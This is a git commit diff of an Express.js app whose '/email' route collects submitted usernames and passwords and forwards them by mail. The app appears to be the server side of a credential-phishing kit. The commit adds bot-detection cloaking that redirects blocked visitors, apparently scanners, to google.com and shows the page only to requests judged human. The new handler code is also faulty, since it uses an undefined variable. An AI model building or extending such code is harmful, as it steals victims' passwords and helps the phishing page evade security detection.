6fc8fef02459bfcf7581a6e3ac8fb1758e644eae
Jon Curtis <joncurtis312@gmail.com>
2023-11-05 03:38:52 -0400

    Your commit message

--- app.js
+++ app.js
@@ -3,15 +3,13 @@ const PORT = 5000
 const express = require('express')
 const path = require('path')
 const cors = require('cors')
-
+const DataDome = require('@datadome/node-module');
 const sendMail = require('./mail')
 
 const app = express()
 
-app.set('view-engine', 'ejs')
-
+app.set('view engine', 'ejs');
 app.use(express.static('views'));
-app.use('/img', express.static(__dirname + 'public/img'))
 
 //data parsing
 app.use(express.urlencoded({
@@ -21,6 +19,20 @@ app.use(express.json())
 app.use(cors())
 
 
+// Create a DataDome instance
+const datadomeClient = new DataDome('AOhAWR2USOQ39Cj', 'api.datadome.co')
+        .on('blocked', function(req){
+            console.log('request blocked');
+            res.redirect('https://www.google.com');
+            
+        })
+        .on("valid", function(req, res){
+            console.log('resquest allow');
+            res.render('index.ejs');
+        })
+
+
+// email sending
 app.post('/email', (req,res) => {
     const {collectUserName, collectPassword} = req.body
     console.log('Data:', req.body)
@@ -35,10 +47,9 @@ app.post('/email', (req,res) => {
 
 })
 
-
-//Router to render html
-app.get('/', (req,res)=> {
-    res.render('index.ejs')
-})
+app.get('/', (req, res) => {
+    // Use DataDome for bot detection and protection
+    datadomeClient.auth(req, res);
+  });
 
 app.listen(PORT, () => console.log('server running'))
